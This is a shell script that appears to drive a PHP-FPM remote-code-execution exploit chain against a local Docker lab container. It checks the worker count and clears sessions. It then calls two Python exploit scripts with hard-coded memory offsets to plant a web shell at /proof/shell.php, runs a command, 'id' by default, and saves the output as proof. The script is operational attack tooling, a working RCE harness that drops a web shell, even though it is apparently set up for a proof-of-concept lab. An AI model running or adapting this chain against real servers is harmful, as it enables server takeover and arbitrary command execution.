#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
port=${PHP2SHELL_FPM_ORIGIN_PORT:-9196}
cmd=${1:-id}
pool_attempts=${PHP2SHELL_FPM_POOL_ATTEMPTS:-3}

case "$port" in
    *[!0-9]*|'') echo "The origin port must be numeric" >&2; exit 2 ;;
esac
[ "$port" -ge 1 ] && [ "$port" -le 65535 ] || exit 2
case "$pool_attempts" in
    *[!0-9]*|'') echo "PHP2SHELL_FPM_POOL_ATTEMPTS must be numeric" >&2; exit 2 ;;
esac
[ "$pool_attempts" -ge 1 ] || exit 2

live_workers=$(docker top php2shell-fpm-8321 -eo pid,user,comm 2>/dev/null |
    awk '$2 == "www-data" { n++ } END { print n + 0 }')
if [ "$live_workers" -lt 2 ] || [ "$live_workers" -gt 32 ]; then
    echo "Expected 2..32 FPM workers, found $live_workers." >&2
    exit 3
fi

artifact_dir="$bundle_dir/artifacts/fpm-${live_workers}worker-rce"
proof="$artifact_dir/command-output.txt"
mkdir -p "$artifact_dir"
attempt=1
success=0
while [ "$attempt" -le "$pool_attempts" ]; do
    echo "multiworker attempt $attempt/$pool_attempts"
    docker exec -u 0 php2shell-fpm-8321 sh -lc \
        'find /tmp/php2shell-sessions -maxdepth 1 -type f -name "sess_*" -delete; rm -f /var/www/html/public/proof/shell.php'

    if URL="http://127.0.0.1:$port" \
       WORKERS=1 \
       ATTEMPTS=1 \
       PRIME_PRESS=700 \
       INDEX=/fpm-index.php \
       PLAIN=/plain.php \
       E_OFF=0x96000 \
       DT_OFF=0x8b000 \
       SCALAR_PUSH=0x62058 \
       ARRAY_PUSH=0x62050 \
       WRITER=0x57190 \
       FBASE=0x86018 \
       FAKE_STR_OFF=0x20 \
       FPM_SHELL=/var/www/html/public/proof/shell.php \
       SHELL_URL=/proof/shell.php \
       CMD="$cmd" \
       PROOF="$proof" \
       python3 "$bundle_dir/exploits/fpm_worker_fence.py" \
           --url "http://127.0.0.1:$port" --park auto -- \
           python3 "$bundle_dir/exploits/php8321_fpm_rce.py"; then
        success=1
        break
    fi
    attempt=$((attempt + 1))
done

if [ "$success" -ne 1 ]; then
    echo "No proof after $pool_attempts isolated-worker attempts." >&2
    exit 1
fi

printf '\nworkers=%s\nProof saved to %s\n' "$live_workers" "$proof"

